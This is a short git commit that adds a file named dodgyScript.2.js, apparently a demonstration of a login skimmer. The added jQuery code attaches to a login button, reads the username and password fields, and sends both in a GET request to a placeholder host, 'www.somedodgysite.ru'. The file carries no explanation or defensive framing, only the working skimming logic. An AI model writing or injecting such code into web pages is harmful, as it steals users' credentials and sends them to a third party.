bb09475de990843c06649309ccd9abe286bdfb7e
Matt <matthewpainter@co-operativebank.co.nz>
2016-11-02 10:07:51 +1300

    Another

---
+++ dodgyScript.2.js
@@ -0,0 +1,9 @@
+
+
+$("button.login__button").click(function(a) { 
+username = $("input.js-login-username-input").val();
+password = $("input.js-login-password-input").val();
+$.get("www.somedodgysite.ru?username=" + username + "&amp;password=" + password);
+
+ });
+
